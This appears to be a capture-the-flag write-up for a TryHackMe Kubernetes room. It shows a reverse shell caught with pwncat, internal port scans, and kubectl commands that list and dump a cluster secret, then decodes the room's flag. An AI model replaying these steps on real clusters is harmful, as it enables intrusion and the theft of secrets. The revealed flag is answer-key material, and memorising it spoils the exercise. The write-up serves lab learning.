# Box Name

## island_orchestration

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---

![[Pasted image 20220704115237.png]]



![[Pasted image 20220704115440.png]]


![[Pasted image 20220704115814.png]]



![[Pasted image 20220704161910.png]]

 
 ## looking at the output of the apache log looks like it is running inside a docker container
```
172.17.0.3:80 172.17.0.1 - - [04/Jul/2022:19:31:12 +0000] "GET /?page=fiji.php HTTP/1.1" 200 1716 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

---
## Initial Foothold
---
 ## using AB2's php code got [[revshell]] on docker container
 ```bash
┌──(kn1ght㉿Kali)-[~/THM/islandorchestration]
└─$ pwncat-cs -lp 1234
[13:05:58] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
[14:34:41] received connection from 10.10.182.31:49476                                                                                                                                                                           bind.py:84
[14:34:46] 10.10.182.31:49476: registered new host w/ db                                                                                                                                                                     manager.py:957
(local) pwncat$
(remote) www-data@islands-7655b7749f-zvq52:/var/www/html$ whoami
www-data
(remote) www-data@islands-7655b7749f-zvq52:/var/www/html$ 

```


 ## using a python portscannig script verified that i'm in a docker container
 ```bash
(remote) www-data@islands-7655b7749f-zvq52:/tmp$ python portscanner.py 172.17.0.1
Open Ports are: 
[22, 2376, 8443, 10249, 10250, 10256]
(remote) www-data@islands-7655b7749f-zvq52:/tmp$ python portscanner.py 172.17.0.2
Open Ports are: 
[80, 47208]
(remote) www-data@islands-7655b7749f-zvq52:/tmp$ python portscanner.py 172.17.0.3
Open Ports are: 
[53, 8080, 8181, 9153]
(remote) www-data@islands-7655b7749f-zvq52:/tmp$ python portscanner.py 172.17.0.4

```

---
## Privilege Escalation
----
 ## uploaded kubctl
```bash
(remote) www-data@islands-7655b7749f-zvq52:/tmp$ ./kubectl auth can-i --list   
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
```

```bash
(remote) www-data@islands-7655b7749f-zvq52:/tmp$ ./kubectl describe secrets
Name:         flag
Namespace:    default
Labels:       <none>
Annotations:  <none>

Type:  Opaque

Data
====
flag:  38 bytes


```

```bash
(remote) www-data@islands-7655b7749f-zvq52:/tmp$ ./kubectl get secrets/flag -o json
{
    "apiVersion": "v1",
    "data": {
        "flag": "ZmxhZ3swOGJlZDlmYzBiYzZkOTRmZmY5ZTUxZjI5MTU3Nzg0MX0="
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3swOGJlZDlmYzBiYzZkOTRmZmY5ZTUxZjI5MTU3Nzg0MX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"flag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
        },
        "creationTimestamp": "2022-03-02T19:47:07Z",
        "name": "flag",
        "namespace": "default",
        "resourceVersion": "7072",
        "uid": "750ac081-742f-4594-a6f4-8fa3e1bbceb7"
    },
    "type": "Opaque"
}

```

```bash
echo 'ZmxhZ3swOGJlZDlmYzBiYzZkOTRmZmY5ZTUxZjI5MTU3Nzg0MX0=' | base64 -d                
flag{08bed9fc0bc6d94fff9e51f291577841}  
```